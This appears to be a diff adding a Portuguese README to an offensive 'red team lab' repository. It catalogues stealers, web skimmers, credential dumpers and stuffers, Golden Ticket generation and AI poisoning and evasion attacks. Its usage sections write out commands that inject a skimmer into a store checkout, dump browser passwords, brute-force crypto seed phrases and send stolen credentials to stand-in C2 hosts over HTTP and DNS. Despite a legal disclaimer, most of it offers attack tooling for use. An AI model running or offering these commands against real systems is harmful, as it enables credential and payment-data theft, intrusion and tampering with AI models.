@@ -4,6 +4,236 @@
 
 Este projeto reúne explorações práticas, scripts de ataque, stealers, bruteforcers, exfiltradores stealth, e agora módulos de ataques adversariais contra Inteligência Artificial, tudo pronto para estudos, treinos e simulações de guerra cibernética realista.
 
+
+
+markdown
+
+Copiar
+# 🛡️ Security Stuffers Lab – Laboratório Completo de Simulação de Ataques Avançados
+
+## 📜 Visão Geral do Laboratório
+O Security Stuffers Lab é uma plataforma modular de simulação de cenários APT e Red Team, cobrindo todo o ciclo de ataque desde o reconhecimento até a exfiltração e persistência. Cada módulo reproduz técnicas reais, mapeadas no MITRE ATT&CK, para:
+
+- Input Capture  
+- Credential Access & Abuse  
+- Protocol Abuse (HTTP, DNS, WebSocket)  
+- Malware Stealth & Obfuscation  
+- Pós‐exploração e Movimentação Lateral  
+- Exfiltração furtiva (HTTP, DNS, out-of-band)  
+- Ataques contra IA/ML  
+
+**Use este laboratório em ambientes controlados e com autorização explícita.**
+
+---
+
+## 📂 Mapa de Módulos
+
+1. **Stealers Attack Framework**  
+   - web-skimmers/  
+   - request-smuggling/  
+   - mobile-stealers/  
+   - fuzzers-exploiters/  
+   - automation/  
+
+2. **Crypto Attack Framework**  
+   - stealers/  
+   - bruteforce/  
+   - exfiltration/  
+   - delivery-methods/  
+   - postexploitation/  
+
+3. **Credential Attack Framework**  
+   - dumpers/  
+   - stuffers/  
+   - parsers/  
+   - exfiltration/  
+   - postexploitation/  
+
+4. **AI Adversarial Attacks**  
+   - evasion-attacks/  
+   - poisoning-attacks/  
+   - model-extraction/  
+   - membership-inference/  
+   - adversarial-defense/  
+
+5. **Advanced Web Attack Vectors**  
+   - jwt-attacks/  
+   - http-request-smuggling/  
+   - business-logic-flaws/  
+   - broken-object-authorization/  
+   - advanced-sqli-oob/  
+   - cache-deception/  
+   - websocket-attacks/  
+   - clickjacking-frame-injection/  
+
+6. **AD-Attacks Framework**  
+   - discovery/  
+   - credential-access/  
+   - lateral-movement/  
+   - persistence/  
+   - exfiltration/  
+
+---
+
+## 🎯 Pipeline Genérico de Ataque
+1. **Reconhecimento** (AD-Attacks / web-crawling)  
+2. **Initial Access** (phishing Web3, skimmers, JWT bypass)  
+3. **Execution & Credential Capture** (dumpers, input capture, RATs)  
+4. **Privilege Escalation** (Kerberos Golden Ticket, JWT none-alg)  
+5. **Lateral Movement** (WMI, RPC, SSH, WebSocket hijack)  
+6. **Persistence** (admin-sdholder backdoor, browser extension stealth)  
+7. **Exfiltração Stealth** (HTTP POST, DNS tunneling, cache poisoning)  
+8. **Covering Tracks & Cleanup** (obfuscators, garbage collectors)  
+
+---
+
+## 🔍 Mapeamento MITRE ATT&CK (Exemplos)
+| Tática                         | Técnica                                   | Código             |
+|--------------------------------|-------------------------------------------|--------------------|
+| Input Capture                  | Clipboard Hijacking                       | T1115              |
+| Credential Access              | LSASS Dumping / Browser Dumping           | T1003.001 / T1555  |
+| Valid Accounts                 | Web App Logon                             | T1078.004          |
+| Exfiltration Over Alt. Protocol| DNS Tunneling / HTTP POST Stealth         | T1048 / T1048.003  |
+| Protocol Abuse                 | HTTP Smuggling                            | T1170              |
+| Model Evasion                  | Adversarial Examples (FGSM, PGD)          | N/A (ATLAS)        |
+| Kerberos Persistence           | Golden Ticket                             | T1558.001          |
+| Remote Service Abuse           | WMI Exec / RPC                            | T1021              |
+
+---
+
+## 🛠️ Instalação & Requisitos
+- Python 3.9+ (venv ou Pipenv)  
+- Node.js (para payloads WebSocket / JWT)  
+- Ferramentas nativas: `curl`, `openssl`, `dig`  
+- Permissões elevadas (LSASS dumpers, memory scrapers)  
+- Ambiente isolado (VM, container, rede de laboratório)  
+
+```bash
+git clone https://github.com/SeuRepo/Security-Stuffers-Lab.git
+cd Security-Stuffers-Lab
+pip install -r requirements.txt
+🚀 Como Usar
+Cada módulo possui um README.md com exemplos detalhados. Abaixo, uma amostra de comandos:
+
+1. Stealers Attack Framework
+bash
+
+Copiar
+# Injetar skimmer stealth em checkout web
+python web-skimmers/exfiltration/stealth-uploader.py \
+  --target https://loja-alvo.com/checkout \
+  --payload web-skimmers/skimmer_webapp/loader.js
+
+# Simular Request Smuggling TE.CL
+python request-smuggling/smuggler/te-cl-smuggle.py \
+  --proxy-front nginx \
+  --proxy-back apache \
+  --host alvo.com
+
+# Capturar clipboard em Android
+adb install mobile-stealers/android-clipboard-monitor.apk
+python mobile-stealers/android-clipboard-monitor/run.py
+2. Crypto Attack Framework
+bash
+
+Copiar
+# Stealer de browser + seeds
+python crypto-attacks/stealers/Chimera/stealer.py
+
+# Brute-force de BIP-39
+python crypto-attacks/bruteforce/EnigmaCracker/bruteforce.py \
+  --missing-word-index 12
+
+# Exfiltração stealth via DNS
+python crypto-attacks/exfiltration/stealth-clip-exfiltrator.py \
+  --c2 dns://exfil.me
+3. Credential Attack Framework
+bash
+
+Copiar
+# Dump de senhas do navegador
+python credentials/dumpers/browser-dumper.py \
+  --output creds.json
+
+# Credential Stuffing em portal
+python credentials/stuffers/credential_stuffer.py \
+  --combo creds.json --threads 50
+
+# Enviar credenciais roubadas para C2
+python credentials/exfiltration/stealth-uploader.py \
+  --file valid-creds.txt --url https://c2.server/upload
+4. AI Adversarial Attacks
+bash
+
+Copiar
+# Gerar exemplo adversarial FGSM
+python ai-adversarial-attacks/evasion-attacks/fgsm-attack.py \
+  --model resnet50 --input img.jpg --epsilon 0.01
+
+# Inserção de backdoor em dataset
+python ai-adversarial-attacks/poisoning-attacks/backdoor-poisoning-example.py \
+  --dataset data/ --trigger patch.png
+5. Advanced Web Attack Vectors
+bash
+
+Copiar
+# Bypass JWT alg:none
+python advanced-web-attack-vectors/jwt-attacks/jwt_none_algo_bypass.py \
+  --payload '{"role":"admin"}'
+
+# Exploração Blind SQLi OOB via DNS
+python advanced-web-attack-vectors/advanced-sqli-oob/sqli-dns-exfiltrator.py \
+  --url https://vulneravel.com/item?id=1
+6. AD-Attacks Framework
+bash
+
+Copiar
+# Enumeração LDAP stealth
+python ad-attacks/discovery/ldap-enumeration.py \
+  --domain corp.local --user svc_account
+
+# Dump LSASS
+python ad-attacks/credential-access/mimikatz-mini-modules/lsass-dumper.py
+
+# Golden Ticket
+python ad-attacks/persistence/golden-ticket-generator.py \
+  --krbtgt-hash <HASH> --user Administrator \
+  --domain corp.local --outfile gt.kirbi
+🤖 Automação Central
+O runner unifica execução multi-módulo:
+
+bash
+
+Copiar
+python automation/script_lab_runner.py \
+  --modules web-skimmers,request-smuggling \
+  --target https://app.exemplo.com \
+  --mode stealth \
+  --output reports/
+📚 Referências & Boas Práticas
+MITRE ATT&CK & ATLAS
+OWASP Web Security Testing Guide
+IBM Adversarial Robustness Toolbox (ART)
+PortSwigger Research Blog
+DEFCON / Black Hat Papers
+Legislação local de Crimes Cibernéticos
+Nunca execute técnicas sem autorização; use logs, sandboxes e monitore redes para não prejudicar sistemas de produção.
+
+⚠️ Disclaimer Legal
+Este laboratório é apenas para propósito educacional e testes controlados. O uso não autorizado pode constituir crime. Assuma toda responsabilidade por seu ambiente e obtenha permissão explícita antes de qualquer teste.
+
+🚧 Futuras Expansões
+Integração de WebRTC leak exfiltration
+SSRF avançado e WAF bypass
+Phishing kits dinâmicos Web3
+Plugins de browser maliciosos (Chrome, Firefox)
+Ataques físicos adversariais (adversarial patches)
+ZeroLogon exploit para AD em lab
+Automação de chains complexos (multi-fase)
+Domine a arte da guerra cibernética, defenda redes como um hacker e ataque como um pesquisador.
+
+
+
 🎯 O que você encontra aqui
 
 Categoria	Conteúdo
